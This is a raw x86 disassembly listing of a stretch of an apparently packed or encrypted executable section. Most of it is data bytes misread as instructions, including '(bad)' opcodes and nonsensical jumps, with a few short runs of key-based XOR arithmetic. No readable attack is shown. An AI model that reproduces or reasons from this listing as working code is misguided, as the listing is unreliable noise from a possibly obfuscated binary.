  402099:	rol    DWORD PTR [edi+ebx*1],1
  40209c:	mov    eax,ds:0xa50f50c5
  4020a1:	in     eax,0xed
  4020a3:	or     bh,0x49
  4020a6:	sbb    BYTE PTR [ebp+0x65d93149],dl
  4020ac:	inc    esi
  4020ad:	mov    eax,ds:0x51f22bf8
  4020b2:	daa    
  4020b3:	and    bh,0x3a
  4020b6:	es mov edi,0xfd9d6fe7
  4020bc:	adc    eax,0x3e189d9f
  4020c1:	sti    
  4020c2:	leave  
  4020c3:	adc    ah,BYTE PTR [eax+0x7c]
  4020c6:	and    ch,al
  4020c8:	or     al,0x87
  4020ca:	addr16 call 0xa1a50541
  4020d0:	push   edi
  4020d1:	adc    eax,0x12ad62c4
  4020d6:	ins    BYTE PTR es:[edi],dx
  4020d7:	xchg   edx,edi
  4020d9:	pop    ebp
  4020da:	and    ebx,edx
  4020dc:	xchg   esi,eax
  4020dd:	pop    edx
  4020de:	xor    eax,DWORD PTR [edi]
  4020e0:	loope  0x402066
  4020e2:	jbe    0x402114
  4020e4:	jnp    0x4020cc
  4020e6:	aad    0xc7
  4020e8:	test   BYTE PTR [ebx+0x1b],bh
  4020eb:	sbb    al,0x91
  4020ed:	in     al,0x3d
  4020ef:	leave  
  4020f0:	push   cs
  4020f1:	jmp    0xb232132
  4020f6:	mov    WORD PTR [ebx],?
  4020f8:	mov    dl,0x62
  4020fa:	push   edi
  4020fb:	adc    eax,0xf32c62fc
  402100:	imul   ecx,ebx,0xffffffa8
  402103:	out    dx,al
  402104:	imul   eax,ecx,0xbde30e5a
  40210a:	xor    ebx,DWORD PTR [edx+0x5a]
  40210d:	mov    WORD PTR [ebp+0x75],ss
  402110:	arpl   WORD PTR [eax],sp
  402112:	outs   dx,DWORD PTR ds:[esi]
  402113:	rcr    BYTE PTR [esi+0x2b],cl
  402116:	jo     0x4020a9
  402118:	clc    
  402119:	sub    DWORD PTR ds:0xd47ed201,ebp
  40211f:	inc    ebp
  402120:	nop
  402121:	xor    BYTE PTR [esi],cl
  402123:	push   ds
  402124:	aad    0x52
  402126:	mov    bl,0x88
  402128:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402129:	inc    edi
  40212a:	outs   dx,BYTE PTR ds:[esi]
  40212b:	mov    al,0xe5
  40212d:	push   0xf6641120
  402132:	(bad)  
  402133:	mov    esi,0xdd55334d
  402138:	inc    esp
  402139:	mov    BYTE PTR [edx-0x76],bl
  40213c:	sub    cl,BYTE PTR es:[edi+0xe11fc30]
  402143:	sub    eax,0x4a9bd8c8
  402148:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402149:	fdiv   st(3),st
  40214b:	cli    
  40214c:	das    
  40214d:	xor    ch,BYTE PTR [esp+edx*8+0x4c]
  402151:	push   eax
  402152:	add    DWORD PTR [ecx-0x8],eax
  402155:	push   esp
  402156:	cdq    
  402157:	es cs aam 0xb0
  40215b:	pushf  
  40215c:	fmul   QWORD PTR [ebx]
  40215e:	sahf   
  40215f:	mov    esp,DWORD PTR [edx]
  402161:	call   0x383fa388
  402166:	in     al,dx
  402167:	mov    esi,0x7d612b9a
  40216c:	retf   
  40216d:	ret    
  40216e:	and    BYTE PTR [edi-0x1d8bfe73],dh
  402174:	outs   dx,BYTE PTR ds:[esi]
  402175:	adc    ebp,ebp
  402177:	xor    al,0x31
  402179:	inc    eax
  40217a:	scas   eax,DWORD PTR es:[edi]
  40217b:	pop    ebx
  40217c:	mov    esi,0x3e945a5f
  402181:	cmp    bh,BYTE PTR [eax]
  402183:	mov    ebx,ebp
  402185:	xor    eax,0x27ef9796
  40218a:	or     bl,BYTE PTR [ebp-0x2a]
  40218d:	mov    BYTE PTR [ebx],ah
  40218f:	(bad)  
  402190:	cwde   
  402191:	jnp    0x4021c2
  402193:	pushf  
  402194:	xchg   edx,eax
  402195:	pop    esp
  402196:	mov    ?,WORD PTR [ebx]
  402198:	xchg   edx,eax
  402199:	mov    eax,ds:0xc987dba
  40219e:	addr16 clc 
  4021a0:	sub    eax,0x595bc2c4
  4021a5:	pop    ebp
  4021a6:	add    eax,DWORD PTR ds:0x2b76bf3c
  4021ac:	adc    al,0x3e
  4021ae:	ds jl  0x40221d
  4021b1:	dec    ebp
  4021b2:	inc    ebx
  4021b3:	sub    al,0xcc
  4021b5:	aad    0xa2
  4021b7:	les    eax,FWORD PTR [ebx]
  4021b9:	ins    BYTE PTR es:[edi],dx
  4021ba:	test   DWORD PTR [edi],esi
  4021bc:	sbb    al,0xc0
  4021be:	jle    0x402169
  4021c0:	cwde   
  4021c1:	pop    es
  4021c2:	cmp    al,0x4c
  4021c4:	jno    0x4021bf
  4021c6:	shl    BYTE PTR [esi],0x1
  4021c9:	ficomp DWORD PTR [eax+esi*8-0x34]
  4021cd:	out    dx,eax
  4021ce:	xchg   ebx,eax
  4021cf:	or     esp,DWORD PTR [esi+0x515f32c2]
  4021d5:	(bad)  
  4021d6:	data16 cli 
  4021d8:	test   al,0x8d
  4021da:	neg    DWORD PTR [edi+ebx*4+0x1c]
  4021de:	dec    esp
  4021df:	adc    eax,0x453b6696
  4021e4:	(bad)  
  4021e5:	scas   eax,DWORD PTR es:[edi]
  4021e6:	les    ebp,FWORD PTR [edx+0x6f]
  4021e9:	mov    ebx,0x1c8b6478
  4021ee:	aaa    
  4021ef:	nop
  4021f0:	out    dx,eax
  4021f1:	les    ebx,FWORD PTR [esi-0x43]
  4021f4:	xchg   esp,edi
  4021f6:	ins    BYTE PTR es:[edi],dx
  4021f7:	push   ecx
  4021f8:	fwait
  4021f9:	in     al,0xd0
  4021fb:	jmp    0xbe4f2d8c
  402200:	fstp   TBYTE PTR [edi]
  402202:	jmp    edx
  402204:	sub    edi,ecx
  402206:	cmp    BYTE PTR [ecx-0x43441a7b],dl
  40220c:	fcom   QWORD PTR [edx*1-0xcd6650c]
  402213:	int    0x3a
  402215:	and    ah,BYTE PTR [edi]
  402217:	paddusw mm7,QWORD PTR [edx-0x700e7724]
  40221e:	popf   
  40221f:	fdivr  st(4),st
  402221:	dec    ecx
  402222:	push   ebp
  402223:	out    0xea,al
  402225:	fidivr DWORD PTR [edi-0x64a75557]
  40222b:	daa    
  40222c:	jnp    0x402234
  40222e:	mov    ecx,0xc91382b5
  402233:	addr16 cmp al,0xf0
  402236:	jo     0x402274
  402238:	push   esi
  402239:	xlat   BYTE PTR ds:[ebx]
  40223a:	mov    ds:0x94485074,eax
  40223f:	mov    al,0x81
  402241:	pop    esp
  402242:	sub    DWORD PTR [edi-0x21cc05bf],ebx
  402248:	xchg   esi,eax
  402249:	into   
  40224a:	cwde   
  40224b:	clc    
  40224c:	sbb    bh,BYTE PTR [ebx+0x2c]
  40224f:	or     ah,BYTE PTR [ecx]
  402251:	div    ecx
  402253:	push   ecx
  402254:	inc    esi
  402255:	push   0x0
  402257:	shr    ecx,0xa2
  40225a:	test   al,0xfb
  40225c:	pop    ecx
  40225d:	mov    edi,0x9f33c0f8
  402262:	push   0x20747618
  402267:	mov    DWORD PTR [eax+0x6adb73fa],eax
  40226d:	xchg   DWORD PTR [edx+edx*8-0xa7a6eb2],edi
  402274:	sbb    eax,DWORD PTR [ebp+edi*4+0x68022fbc]
  40227b:	jo     0x4022ec
  40227d:	popf   
  40227e:	aas    
  40227f:	adc    esp,DWORD PTR [eax+0x60da96cd]
  402285:	jae    0x4022f5
  402287:	adc    al,0x8b
  402289:	stos   DWORD PTR es:[edi],eax
  40228a:	push   esp
  40228b:	push   esp
  40228c:	aam    0xe6
  40228e:	(bad)  
  40228f:	arpl   WORD PTR [edi+0x3b],di
  402292:	or     dh,BYTE PTR [ebp+0x2dffb62e]
  402298:	lahf   
  402299:	sbb    al,0xf7
  40229b:	xchg   BYTE PTR [ecx],ah
  40229d:	add    DWORD PTR [ecx-0x4f],ebp
  4022a0:	enter  0xbd5,0x28
  4022a4:	loop   0x4022d9
  4022a6:	mov    BYTE PTR [ecx+0x42a79125],0x0
  4022ad:	aad    0xa7
  4022af:	inc    edx
  4022b0:	add    BYTE PTR [ebx],al
  4022b2:	(bad)  
  4022b3:	cmp    DWORD PTR [ecx],eax
  4022b5:	jne    0x402dc8
  4022bb:	mov    eax,DWORD PTR [ebp+0x8]
  4022be:	mov    ecx,DWORD PTR [ebp-0x18]
  4022c1:	sbb    DWORD PTR ds:0x42a855,0x2700
  4022cb:	xor    eax,esi
  4022cd:	add    eax,edi
  4022cf:	jmp    0x40256e
  4022d4:	xlat   BYTE PTR ds:[ebx]
  4022d5:	cmp    eax,0xd9d5d1c7
  4022da:	fxch   st(1)
  4022dc:	mov    edi,0x82682c5b
  4022e1:	or     DWORD PTR [esp+eax*8+0x78780904],esp
  4022e8:	(bad)  
  4022e9:	jle    0x402363
  4022eb:	js     0x402293
  4022ed:	inc    ecx
  4022ee:	mov    dl,0x8c
  4022f0:	xchg   esi,eax
  4022f1:	int3   
  4022f2:	in     eax,dx
  4022f3:	and    ecx,DWORD PTR [ecx]
  4022f5:	loop   0x402310
  4022f7:	xchg   BYTE PTR [esi+0x1aa92fad],dl
  4022fd:	xor    al,0x7a
  4022ff:	xor    BYTE PTR [esi],ch
  402301:	call   0x31aad296
  402306:	cdq    
  402307:	loop   0x4022f3
  402309:	inc    ebx
  40230a:	cmc    
  40230b:	(bad)  
  40230c:	test   eax,0x2ddf2292
  402311:	jno    0x402302
  402313:	(bad)  
  402314:	ins    DWORD PTR es:[edi],dx
  402315:	mov    WORD PTR [edi],?
  402317:	cmp    eax,0x1b2122bb
  40231c:	adc    eax,0x7043b5c6
  402321:	ret    
  402322:	mov    esp,0x8bcff6f2
  402327:	or     eax,0x2c729905
  40232c:	jle    0x402393
  40232e:	mov    ecx,0xff044854
  402333:	mov    al,0xa2
  402335:	out    dx,eax
  402336:	mov    ebp,DWORD PTR [edx+0x33]
  402339:	es push ds
  40233b:	jbe    0x402340
  40233d:	xor    BYTE PTR [ecx],ch
  40233f:	cmc    
  402340:	jmp    0x6930:0x287c98f4
  402347:	jmp    0x7d88fc35
  40234c:	cmc    
  40234d:	shl    eax,0x91
  402350:	or     ebx,DWORD PTR [edx-0x6e0e1119]
  402356:	inc    esp
  402357:	popa   
  402358:	mov    eax,ds:0x8170a02b
  40235d:	daa    
  40235e:	add    edi,DWORD PTR [ebp-0x17]
  402361:	cs in  al,0xb6
  402364:	adc    BYTE PTR [ebp+0x392cdcce],al
  40236a:	adc    cl,BYTE PTR [edi+0x61c09908]
  402370:	les    edx,FWORD PTR [ecx+0x14]
  402373:	clc    
  402374:	mov    ds:0x8390dac5,eax
  402379:	retf   0xaf67
  40237c:	pop    es
  40237d:	lds    ebp,FWORD PTR [edx-0x1b]
  402380:	sbb    al,0xee
  402382:	push   eax
  402383:	aam    0x4
  402385:	push   DWORD PTR [ebx+0x78]
  402388:	dec    edx
  402389:	push   DWORD PTR [edx-0x53077f9]
  40238f:	shl    DWORD PTR [ebp-0x4e47ad68],0x8d
  402396:	call   0xb096:0x1c4b09e3
  40239d:	in     al,dx
  40239e:	rol    DWORD PTR [ecx],0x92
  4023a1:	movs   DWORD PTR es:[edi],DWORD PTR fs:[esi]
  4023a3:	inc    ebp
  4023a4:	pop    es
  4023a5:	mov    esp,0x996354e2
  4023aa:	pop    edi
  4023ab:	cli    
  4023ac:	lods   al,BYTE PTR ds:[esi]
  4023ad:	das    
  4023ae:	cmp    DWORD PTR [eax+eiz*2],esp
  4023b1:	sub    eax,0xa5e7d489
  4023b6:	mov    esp,0x55d8952d
  4023bb:	mov    ebx,0x2ff768a4
  4023c0:	out    dx,eax
  4023c1:	mov    al,0x22
  4023c3:	inc    ebp
  4023c4:	xchg   dh,ah
  4023c6:	inc    ecx
  4023c7:	scas   al,BYTE PTR es:[edi]
  4023c8:	cs stos BYTE PTR es:[edi],al
  4023ca:	sub    DWORD PTR [eax],edx
  4023cc:	or     bl,BYTE PTR [eax+eax*8-0x2c]
  4023d0:	add    eax,DWORD PTR [ebp-0x57]
  4023d3:	and    BYTE PTR [ebp+0x57],0x1c
  4023d7:	fld    DWORD PTR [edx+0x6a6e1a02]
  4023dd:	or     al,0xd8
  4023df:	push   ds
  4023e0:	xchg   edi,eax
  4023e1:	xchg   DWORD PTR [ebx-0x3fcdce9a],ebp
  4023e7:	bswap  esp
  4023e9:	push   ds
  4023ea:	inc    esi
  4023eb:	and    esi,DWORD PTR [eax-0x1]
  4023ee:	test   al,0x3d
  4023f0:	loopne 0x4023a3
  4023f2:	mov    esp,0xc09fa42b
  4023f7:	jmp    0x3146b78c
  4023fc:	lods   eax,DWORD PTR ds:[esi]
  4023fd:	test   al,0xc
  4023ff:	adc    al,0x34
  402401:	mov    ds:0x8bbeeeb6,eax
  402407:	dec    esp
  402408:	mov    ds:0x1593877,al
  40240d:	xchg   edx,eax
  40240e:	add    al,0xb9
  402410:	test   eax,0xd73580d6
  402415:	sbb    al,0x3
  402417:	xchg   ebp,eax
  402418:	dec    edi
  402419:	fstp   QWORD PTR [ebx+0x5ebc4d17]
  40241f:	adc    al,0x9b
  402421:	push   ecx
  402422:	daa    
  402423:	add    al,0x25
  402425:	dec    edi
  402426:	inc    esp
  402427:	mov    al,ds:0x1e6961fb
  40242c:	sti    
  40242d:	lods   eax,DWORD PTR ds:[esi]
  40242e:	addr16 loopne 0x40246a
  402431:	sub    edi,DWORD PTR [ecx+ecx*4]
  402434:	das    
  402435:	adc    al,0xac
  402437:	sbb    al,0xb6
  402439:	outs   dx,DWORD PTR ds:[esi]
  40243a:	dec    ebp
  40243b:	das    
  40243c:	cwde   
  40243d:	call   0x814d:0x3e429c1d
  402444:	pop    esp
  402445:	adc    eax,esp
  402447:	mov    al,ds:0x58b52e06
  40244c:	mov    eax,ds:0xf1482f56
  402451:	mov    al,ds:0x83f88fd8
  402456:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402457:	and    BYTE PTR [edx],cl
  402459:	pop    es
  40245a:	or     ebp,DWORD PTR [eax]
  40245c:	outs   dx,DWORD PTR ds:[esi]
  40245d:	sub    BYTE PTR [edx+0x51],cl
  402460:	in     al,dx
  402461:	sar    DWORD PTR [ebx],0x8e
  402464:	fbld   TBYTE PTR [edx]
  402466:	inc    edx
  402467:	outs   dx,BYTE PTR ds:[esi]
  402468:	jle    0x40240c
  40246a:	mov    ch,0x27
  40246c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40246d:	(bad)  
  40246f:	cs mov esp,0x8968f939
  402475:	jl     0x40243f
  402477:	aam    0x79
  402479:	mov    al,BYTE PTR [edi]
  40247b:	test   DWORD PTR [ebx-0x23181614],edi
  402481:	jmp    0x6f2b:0x7c408c79
  402488:	mov    cl,0x93
  40248a:	cmp    eax,0x828a75d2
  40248f:	push   ebp
  402490:	inc    esi
  402491:	addr16 jge 0x402439
  402494:	xchg   esi,eax
  402495:	add    eax,0x934956af
  40249a:	xor    ch,bl
  40249c:	mov    eax,0x624d4f9e
  4024a1:	adc    ah,BYTE PTR [ecx-0xb]
  4024a4:	aam    0xea
  4024a6:	mov    ds:0xbfd22669,eax
  4024ab:	ret    
  4024ac:	push   esi
  4024ad:	pop    ecx
  4024ae:	lds    ebp,FWORD PTR [eax]
  4024b0:	adc    BYTE PTR [ecx+0x12],dl
  4024b3:	aam    0x76
  4024b5:	test   eax,0xefc02908
  4024ba:	enter  0x77e1,0x73
  4024be:	push   esi
  4024bf:	cld    
  4024c0:	ins    DWORD PTR es:[edi],dx
  4024c1:	cli    
  4024c2:	lahf   
  4024c3:	sub    eax,0xc6cf0921
  4024c8:	xor    al,0xd3
  4024ca:	sub    BYTE PTR [esi],0x3d
  4024cd:	cmc    
  4024ce:	sub    al,0xed
  4024d0:	sub    BYTE PTR [ecx-0x120df4c8],dl
  4024d6:	loope  0x402485
  4024d8:	xchg   edx,eax
  4024d9:	aaa    
  4024da:	int    0xea
  4024dc:	or     eax,0x132c493b
  4024e1:	jecxz  0x4024cd
  4024e3:	mov    al,0xd0
  4024e5:	mov    esp,0x3fa921d1
  4024ea:	imul   ebx,eax,0xb0d4b9d2
  4024f0:	test   ecx,edi
  4024f2:	pop    ss
  4024f3:	into   
  4024f4:	arpl   WORD PTR [esi+0x1a3e35ea],bx
  4024fa:	test   bl,0x83
  4024fd:	pop    ds
  4024fe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4024ff:	push   0x9f5260d9
  402504:	icebp  
  402505:	fild   QWORD PTR [ebx+0x2a19884a]
  40250b:	jmp    FWORD PTR [esi+ecx*1-0x1a]
  40250f:	sbb    esi,DWORD PTR [edi+ebx*8+0x29cfd3a4]
  402516:	dec    ebx
  402517:	pusha  
  402518:	cmp    eax,DWORD PTR [edx-0x54b3c50b]
  40251e:	or     bl,BYTE PTR [ecx-0x79]
  402521:	inc    eax
  402522:	aam    0x2d
  402524:	jns    0x40250d
  402526:	iret   
  402527:	das    
  402528:	inc    esi
  402529:	lock rcr BYTE PTR [edx-0x6d],cl
  40252d:	retf   0xde8e
  402530:	push   ebp
  402531:	jp     0x4024f8
  402533:	adc    eax,0x67aa5ca
  402538:	push   esp
  402539:	ja     0x40251e
  40253b:	xor    BYTE PTR [ecx+0xb],bh
  40253e:	pop    esp
  40253f:	pop    esp
  402540:	fwait
  402541:	sub    al,0xb1
  402543:	fcmovbe st,st(3)
  402545:	pop    ebp
  402546:	sbb    bh,BYTE PTR [ecx+edx*8-0x50]
  40254a:	retf   0x9199
  40254d:	inc    edi
  40254e:	mov    edi,0xca794a03
  402553:	enter  0xa279,0x42
  402557:	mov    eax,ds:0xb28e2eac
  40255c:	bound  esi,QWORD PTR [esi-0x27]
  40255f:	inc    ebp
  402560:	inc    ebx
  402561:	fdivr  st(1),st
  402563:	push   edi
  402564:	mov    edi,0x8729ccd6
  402569:	mov    bl,dl
  40256b:	test   ch,dl
  40256d:	(bad)  
  40256e:	cmp    DWORD PTR [ecx],eax
  402570:	jne    0x402832
  402576:	mov    eax,DWORD PTR [ebp+0x8]
  402579:	mov    ecx,DWORD PTR [ebp-0x10]
  40257c:	xor    eax,esi
  40257e:	add    eax,edi
  402580:	mov    DWORD PTR [ecx],eax
  402582:	jmp    0x402821
  402587:	aas    
  402588:	retf   
  402589:	ret    0xcace
  40258c:	aad    0xd3
  40258e:	fld    DWORD PTR [ecx+eiz*1+0x26]
  402592:	inc    edx
  402593:	fnstcw WORD PTR [ebp+0xf8a8131]
  402599:	js     0x402613
  40259b:	(bad)  
  40259c:	jle    0x402616
  40259e:	js     0x402553
  4025a0:	cwde   
  4025a1:	and    DWORD PTR [esi+0x7e],esp
  4025a4:	mov    al,ds:0xc34d5230
  4025a9:	xor    eax,edi
  4025ab:	mov    dl,0xa4
  4025ad:	xor    BYTE PTR [ebx+0x5fe03621],0x6b
  4025b4:	test   eax,0x410b524f
  4025b9:	push   ds
  4025ba:	sar    DWORD PTR [ebx+0x73],cl
  4025bd:	mov    ebp,0x8fc1fc45
  4025c2:	cmp    DWORD PTR [edx+0x22],esi
  4025c5:	jecxz  0x40258c
  4025c7:	and    DWORD PTR [ecx-0x9],ebp
  4025ca:	sbb    DWORD PTR [eax],edx
  4025cc:	mov    cs,WORD PTR [eax]
  4025ce:	jns    0x4025cd
  4025d0:	cdq    
  4025d1:	out    dx,al
  4025d2:	sbb    ebp,DWORD PTR ds:0x3f7642fd
  4025d8:	es out dx,eax
  4025da:	mov    esp,0x4640ca72
  4025df:	fiadd  WORD PTR [ebx+0x22184569]
  4025e5:	adc    al,0xff
  4025e7:	ins    BYTE PTR es:[edi],dx
  4025e8:	pop    esi
  4025e9:	in     eax,dx
  4025ea:	push   ebx
  4025eb:	mov    esi,0x9db39a64
  4025f0:	pop    edx
  4025f1:	les    edi,FWORD PTR [ebx+0x6]
  4025f4:	xor    ecx,ebx
  4025f6:	mov    edx,ecx
  4025f8:	inc    esp
  4025f9:	push   es
  4025fa:	sbb    bh,ah
  4025fc:	fsin   
  4025fe:	aas    
  4025ff:	jae    0x402661
  402601:	mov    WORD PTR [ecx+0x4734c18],ds
  402607:	xor    ch,ah
  402609:	add    eax,0xfac6c0b9
  40260e:	ja     0x40267b
  402610:	push   0x35ef4ba3
  402615:	fiadd  WORD PTR [ecx+0x7e]
  402618:	ja     0x402633
  40261a:	(bad)  
  40261b:	mov    ds:0x67cf1b45,al
  402620:	jno    0x4025aa
  402622:	jle    0x4025bb
  402624:	lds    ebx,FWORD PTR [ebp-0x6c416582]
  40262a:	test   edi,ebx
  40262c:	jmp    DWORD PTR [edx+0x38]
  40262f:	xor    DWORD PTR [esi-0x66],edi
  402632:	test   al,0x96
  402634:	call   0x9b87:0x7a062ff8
  40263b:	inc    ecx
  40263c:	iret   
  40263d:	aaa    
  40263e:	push   eax
  40263f:	iret   
  402640:	xchg   ebp,eax
  402641:	or     al,0xf2
  402643:	and    eax,0xebcb3f39
  402648:	xchg   edi,eax
  402649:	xlat   BYTE PTR ds:[ebx]
  40264a:	fimul  WORD PTR [ebx+0x47]
  40264d:	push   eax
  40264e:	mov    bh,0x9c
  402650:	push   ss
  402651:	jle    0x40269a
  402653:	mov    WORD PTR [esi+0x22bef670],fs
  402659:	mov    al,0x99
  40265b:	jge    0x4025e1
  40265d:	cmc    
  40265e:	inc    edi
  40265f:	pop    ebx
  402660:	push   esp
  402661:	lahf   
  402662:	xor    bh,BYTE PTR cs:[ebx]
  402665:	imul   esp,DWORD PTR [edx-0x3fc258eb],0xffffffe4
  40266c:	jmp    0x4026bb
  40266e:	inc    ebp
  40266f:	popa   
  402670:	(bad)  
  402671:	ins    BYTE PTR es:[edi],dx
  402672:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402673:	or     al,0x6f
  402675:	dec    esp
  402676:	fist   WORD PTR [esi+esi*2-0x742dbe1e]
  40267d:	jb     0x402616
  40267f:	inc    eax
  402680:	popf   
  402681:	mov    esp,ebp
  402683:	scas   eax,DWORD PTR es:[edi]
  402684:	pop    esp
  402685:	shl    BYTE PTR [esi-0x6],0xdd
  402689:	cld    
  40268a:	xchg   edx,eax
  40268b:	and    eax,0x9c1fc2f5
  402690:	dec    edx
  402691:	or     ecx,DWORD PTR [edx]
  402693:	mov    esi,0x87f26a68
  402698:	rcl    BYTE PTR [ebp+0x54c17ed1],0x70
  40269f:	(bad)  
  4026a0:	arpl   WORD PTR [ecx+0x1e5d1ef7],sp
  4026a6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4026a7:	jmp    0x561d752
  4026ac:	cmp    DWORD PTR [eax+edx*2-0x4f],eax
  4026b0:	sub    eax,0x5fbf4932
  4026b5:	outs   dx,DWORD PTR ds:[esi]
  4026b6:	and    edx,DWORD PTR [edx+0x3e]
  4026b9:	mov    ch,0xed
  4026bb:	xor    BYTE PTR [eax+esi*1+0x66],al
  4026bf:	aad    0x28
  4026c1:	out    0xd3,al
  4026c3:	add    dh,BYTE PTR [ecx-0x10b1a6f1]
  4026c9:	sub    DWORD PTR [edi+0x4f],ebx
  4026cc:	(bad)  
  4026cd:	fidivr DWORD PTR [ebp-0x2d]
  4026d0:	lahf   
  4026d1:	mov    dh,0x7f
  4026d3:	mov    ecx,0x72016de6
  4026d8:	or     dh,BYTE PTR [edx+0x10]
  4026db:	pop    ecx
  4026dc:	iret   
  4026dd:	and    ch,BYTE PTR [edx]
  4026df:	sbb    ch,BYTE PTR [edi]
  4026e1:	mov    eax,ecx
  4026e3:	test   al,0x2c
  4026e5:	sub    al,0x58
  4026e7:	outs   dx,DWORD PTR ds:[esi]
  4026e8:	push   cs
  4026e9:	inc    ebp
  4026ea:	pop    esi
  4026eb:	out    dx,al
  4026ec:	retf   0x2be4
  4026ef:	clc    
  4026f0:	lea    esp,[esi+0x279d26d5]
  4026f6:	or     ecx,edi
  4026f8:	mov    esp,0x3f7d53eb
  4026fd:	xchg   ebp,eax
  4026fe:	sub    al,0x2e
  402700:	or     cl,cl
  402702:	or     DWORD PTR [ebp-0x30145c9e],ebp
  402708:	(bad)  
  40270a:	mov    DWORD PTR [edi-0x1a0539ab],esp
  402710:	cmp    al,0xd9
  402712:	stos   DWORD PTR es:[edi],eax
  402713:	in     al,0xe9
  402715:	ret    0x5e6f
  402718:	(bad)  
  402719:	xchg   esi,eax
  40271a:	(bad)  
  40271b:	adc    eax,0xd8df4469
  402720:	adc    al,0xa1
  402722:	jae    0x402720
  402724:	and    cl,BYTE PTR [edi+0x55]
  402727:	push   esp
  402728:	adc    al,BYTE PTR [eax+edx*8+0x27]
  40272c:	lahf   
  40272d:	push   ebp
  40272e:	inc    esp
  40272f:	addps  xmm2,XMMWORD PTR [edi]
  402732:	add    edi,DWORD PTR [esi]
  402734:	out    0x94,eax
  402736:	pushf  
  402737:	ret    0xab44
  40273a:	inc    ebx
  40273b:	in     eax,0x8d
  40273d:	inc    ebp
  40273e:	rol    BYTE PTR [edx+0x6e],1
  402741:	cmp    eax,0x5c853479
  402746:	ss xor al,ch
  402749:	bnd js 0x402729
  40274c:	call   0xd2ce9152
  402751:	jmp    0x402790
  402753:	jmp    0x38b:0xc558b8ae
  40275a:	loopne 0x402761
  40275c:	mov    ch,0x79
  40275e:	jo     0x4026f7
  402760:	or     cl,BYTE PTR [esi]
  402762:	clc    
  402763:	lahf   
  402764:	sub    al,0x3f
  402766:	dec    ebp
  402767:	cmp    al,0xc8
  402769:	cli    
  40276a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40276b:	push   cs
  40276c:	fld    TBYTE PTR [eax+0x48]
  40276f:	out    dx,eax
  402770:	call   0x7d51:0x41a79d61
  402777:	cmc    
  402778:	mov    DWORD PTR [edi+0x28],0xf001b9b6
  40277f:	sub    ebp,DWORD PTR [edi]
  402781:	out    0x50,eax
  402783:	mov    ch,0x8
  402785:	or     BYTE PTR [eax+esi*2+0xc9cfe9d],bh
  40278c:	push   ebp
  40278d:	fisub  DWORD PTR [edx+0x36]
  402790:	out    dx,al
  402791:	fisttp DWORD PTR [edx+0x3f05c5a5]
  402797:	mov    eax,0xea46df5e
  40279c:	mov    edx,0x3c8c96f3
  4027a1:	inc    edi
  4027a2:	xor    esp,edi
  4027a4:	jmp    0x4027f0
  4027a6:	pop    ebx
  4027a7:	jl     0x4027a0
  4027a9:	mov    eax,0xc035ed43
  4027ae:	add    DWORD PTR [eax+0x7e],ebx
  4027b1:	jmp    0xb776c972
  4027b6:	ja     0x402801
  4027b8:	jo     0x4027c7
  4027ba:	rcl    DWORD PTR [eax],1
  4027bc:	push   esp
  4027bd:	rcl    DWORD PTR [edx-0x71a2fb43],cl
  4027c3:	lods   eax,DWORD PTR ds:[esi]
  4027c4:	inc    ecx
  4027c5:	pop    esp
  4027c6:	daa    
  4027c7:	jmp    ecx
  4027c9:	xchg   edi,eax
  4027ca:	call   0x2c6c:0x7514502a
  4027d1:	and    BYTE PTR [edx],dh
  4027d3:	or     edx,DWORD PTR [ecx]
  4027d5:	or     dl,al
  4027d7:	sbb    DWORD PTR [ebp+0x2834d2dc],ebp
  4027dd:	(bad)  
  4027de:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4027df:	out    dx,eax
  4027e0:	or     ebp,DWORD PTR [ecx]
  4027e2:	adc    BYTE PTR [esi-0x7],ch
  4027e5:	(bad)  
  4027e6:	xor    BYTE PTR ds:0xfc2dbfb1,cl
  4027ec:	outs   dx,DWORD PTR ds:[esi]
  4027ed:	js     0x402813
  4027ef:	out    0x30,eax
  4027f1:	not    BYTE PTR [ebp-0x3d]
  4027f4:	and    al,0x16
  4027f6:	stc    
  4027f7:	push   esi
  4027f8:	test   ecx,0x2226e431
  4027fe:	add    edi,DWORD PTR ss:[ebx+0x4408993f]
  402805:	sub    DWORD PTR [ecx-0x8a50451],edx
  40280b:	inc    esi
  40280c:	dec    eax
  40280d:	mov    fs,WORD PTR [ecx]
  40280f:	sub    esi,esp
  402811:	arpl   WORD PTR [eax+ebp*2+0x55],si
  402815:	and    esp,esp
  402817:	(bad)  
  402818:	arpl   WORD PTR [edi+0x41],ax
  40281b:	test   bl,al
  40281d:	loopne 0x40282d
  40281f:	sahf   
  402820:	and    DWORD PTR [ebx+0x4d8bf045],ecx
  402826:	adc    BYTE PTR [ebx],dh
  402828:	into   
  402829:	mov    edx,0xffcd8d68
  40282e:	sub    edx,ecx
  402830:	add    DWORD PTR [eax],edx
  402832:	mov    eax,ds:0x41ebba
  402837:	mov    eax,DWORD PTR [eax]
  402839:	mov    cx,WORD PTR [ebp-0x4]
  40283d:	movzx  ecx,cx
  402840:	add    ecx,DWORD PTR [eax]
  402842:	mov    DWORD PTR [ebp-0x18],ecx
  402845:	mov    eax,DWORD PTR [ebp+0xc]
  402848:	mov    ecx,DWORD PTR [ebp+0xc]
  40284b:	xor    eax,esi
  40284d:	lea    eax,[eax+eax*1+0x327298]
  402854:	xor    ecx,esi
  402856:	sub    ecx,eax
  402858:	mov    ax,WORD PTR [ebp-0x4]
  40285c:	movzx  eax,ax
  40285f:	cmp    eax,ecx
  402861:	mov    eax,DWORD PTR [ebp+0x10]
  402864:	movzx  ecx,WORD PTR [ebp-0x4]
  402868:	jg     0x402dbb
  40286e:	xor    eax,esi
  402870:	jmp    0x402b0f
  402875:	ret    
  402876:	ror    ecx,cl
  402878:	into   
  402879:	(bad)  
  40287b:	fcmovnbe st,st(1)
  40287d:	out    0x1c,eax
  40287f:	dec    esp
  402880:	stos   BYTE PTR es:[edi],al
  402881:	add    al,0xa5
  402883:	add    al,0x60
  402885:	or     BYTE PTR [eax+edi*2],cl
  402888:	js     0x402888
  40288a:	jle    0x402904
  40288c:	js     0x40288b
  40288e:	pusha  
  40288f:	mov    ?,esi
  402891:	push   es
  402892:	outs   dx,DWORD PTR ds:[esi]
